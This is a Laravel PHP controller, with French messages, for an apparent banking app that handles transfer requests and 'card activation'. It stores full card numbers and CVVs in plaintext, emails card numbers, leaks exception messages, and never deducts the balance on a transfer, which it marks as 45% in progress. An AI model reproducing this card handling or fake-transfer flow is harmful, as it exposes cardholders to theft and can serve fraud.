<?php

namespace App\Http\Controllers;
use App\Models\Virement; 
use App\Mail\Attente;
use Auth;
use Illuminate\Support\Facades\DB;   
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\Request;
use Log;

class VirementController extends Controller
{

    /**
     * Show the transfer form
     */

     public function virementcreate()
     {
         return view('utilisateur.virementcreate');
     }
 
     public function virementstore(Request $request)
     {
        $request->validate([
            'titulaire' => 'required|string|max:50',
            'nom' => 'nullable|string|max:50',
            'prenom' => 'nullable|string|max:50',
             'nombanque' => 'required|string|max:255',
             'iban' => 'required|string|max:34',
             'bic' => 'nullable|string|max:11', // BIC est maintenant optionnel
             'montant' => 'required|numeric|min:1',
         ]);
 
         $user = Auth::user();
 
         if ($user->solde < $request->montant) {
             return response()->json([
                 'success' => false,
                 'message' => 'Solde insuffisant pour ce virement'
             ], 400);
         }
 
         DB::beginTransaction();
 
         try {
            $receiverLastName = trim((string)($request->nom ?? ''));
            $receiverFirstName = trim((string)($request->prenom ?? ''));
            if ($receiverLastName === '' || $receiverFirstName === '') {
                $parts = preg_split('/\s+/', trim((string)$request->titulaire));
                $receiverFirstName = $receiverFirstName !== '' ? $receiverFirstName : ($parts[0] ?? '');
                $receiverLastName = $receiverLastName !== '' ? $receiverLastName : trim(implode(' ', array_slice($parts, 1)));
            }

            $virement = new Virement([
                'slug' => Virement::generateUniquePublicSlug(),
                'nom' => $receiverLastName,
                'prenom' => $receiverFirstName,
                 'nombanque' => $request->nombanque,
                 'titulairebanque' => $request->titulaire, // J'utilise le titulaire du formulaire
                 'iban' => $request->iban,
                 'bic' => $request->bic ?? null, // Null si non fourni   
                 'montant' => $request->montant,
                 'user_id' => (int)Auth()->User()->id, // S'assurer que c'est un int
                 'pourcentage' => 45, // Initialiser à 45%
                 'statut' => 'en_cours', // Initialiser à 'en_cours'
                 'code' => strtoupper('VTG-' . substr(mt_rand(100000, 999999), 0, 6)),
             ]);
             $virement->save();
             
             // Log pour déboguer
             \Log::info("Virement créé - ID: {$virement->id}, User ID: {$virement->user_id}, Auth ID: " . Auth()->User()->id);
 
            //  $user->update(['solde' => $user->solde - $virement->montant]);
 
             DB::commit();
 
             DB::table('historiques')->insert([
                 'type' => 'credit',
                'titre' => 'Virement vers '.$request->nombanque.' - '.trim($receiverFirstName.' '.$receiverLastName),
                 'date_transaction' => now(),
                 'montant' => $request->montant,
                 'user_id' => Auth()->User()->id,
                 'created_at' => now(),
             ]);

             return response()->json([
                 'success' => true,
                 'virement_id' => $virement->id,
                 'slug' => $virement->slug,
                'redirect_url' => '/api/virements/'.$virement->id.'/progress',
                 'message' => 'Virement en cours'
             ], 200);
 
         } catch (\Exception $e) {
             DB::rollBack();
             Log::error('Transfer error : ' . $e->getMessage());
 
             return response()->json([
                 'success' => false,
                 'error' => 'Une erreur s\'est produite lors de l\'enregistrement.',
                 'message' => $e->getMessage()
             ], 500);
         }
     }
 
     public function success(){
         return view('utilisateur.success');
     }
 
     public function activationCarte()
     {
         return view('utilisateur.activationcarte');
     }
 
     public function activationStore(Request $request)
     {
         $allowedTypes = \App\Support\CardCatalog::validationInList();

         $request->validate([
             'card_holder'  => 'required|string|max:100',
             'card_number'  => 'required|string|max:19',
             'expiry_date'  => 'required|string|max:7',
             'cvv'          => 'required|string|max:4',
             'card_type'    => 'required|string|in:'.$allowedTypes,
         ], [
             'card_type.required' => 'Le type de carte est requis.',
             'card_type.in' => 'Type de carte invalide.',
         ]);
     
         $user = Auth::user();
     
         try {
             DB::beginTransaction();
     
             // Clean card number (remove spaces)
             $cardNumber = str_replace(' ', '', $request->card_number);
             
             // Convert MM/YY date format to valid date format (YYYY-MM-DD)
             // MM/YY -> assume YY is the year (ex: 12/25 -> 2025-12-01)
             $expiryParts = explode('/', $request->expiry_date);
             if (count($expiryParts) === 2) {
                 $month = str_pad($expiryParts[0], 2, '0', STR_PAD_LEFT);
                 $year = '20' . str_pad($expiryParts[1], 2, '0', STR_PAD_LEFT); // Assume 20XX
                 $dateExp = $year . '-' . $month . '-01'; // First day of the month
             } else {
                 throw new \Exception('Invalid date format');
             }
             
             // Check if card number already exists for another user
             $existingCard = DB::table('users')
                 ->where('card_number', $cardNumber)
                 ->where('id', '!=', $user->id)
                 ->first();
             
             if ($existingCard) {
                 DB::rollBack();
                if ($request->expectsJson() || $request->is('api/*')) {
                    return response()->json([
                        'success' => false,
                        'message' => 'Ce numéro de carte est déjà utilisé par un autre utilisateur.',
                        'errors' => ['card_number' => ['Ce numéro de carte est déjà utilisé par un autre utilisateur.']]
                    ], 422);
                }
                 return back()->withErrors(['card_number' => 'Ce numéro de carte est déjà utilisé par un autre utilisateur.'])->withInput();
             }
     
             $cardType = strtolower((string) $request->card_type);
             $user->update([
                 'card_number' => $cardNumber,
                 'date_exp'    => $dateExp,
                 'cvv'         => $request->cvv,
                 'card_type'   => $cardType,
                 'card_amount' => \App\Support\CardCatalog::amountForType($cardType),
                 'card_attente' => true, // card pending activation
             ]);
     
             DB::commit();
             
             $mailData = [
                 'client' => $request->card_holder,
                 'card_number' => $cardNumber,
             ];
             Mail::to(auth()->user()->email)->send(new Attente($mailData));
            
            if ($request->expectsJson() || $request->is('api/*')) {
                return response()->json([
                    'success' => true,
                    'message' => 'Votre carte a été soumise pour activation avec succès.'
                ], 200);
            }
             
             return redirect()->route('successCarte')->with('success', 'Votre carte a été soumise pour activation avec succès.');
     
         } catch (\Illuminate\Validation\ValidationException $e) {
             DB::rollBack();
            if ($request->expectsJson() || $request->is('api/*')) {
                return response()->json([
                    'success' => false,
                    'message' => 'Erreurs de validation',
                    'errors' => $e->errors()
                ], 422);
            }
             return back()->withErrors($e->errors())->withInput();
         } catch (\Exception $e) {
             DB::rollBack();
             Log::error('Card activation error : ' . $e->getMessage());
             Log::error('Stack trace: ' . $e->getTraceAsString());
     
            if ($request->expectsJson() || $request->is('api/*')) {
                return response()->json([
                    'success' => false,
                    'message' => 'Une erreur s\'est produite lors de l\'activation de la carte.',
                    'error' => $e->getMessage()
                ], 500);
            }
             return back()->withErrors(['error' => 'Une erreur s\'est produite lors de l\'activation de la carte : ' . $e->getMessage()])->withInput();
         }
     }
 
 
     public function successcarte(){
         return view('utilisateur.success-carte');
     }

}
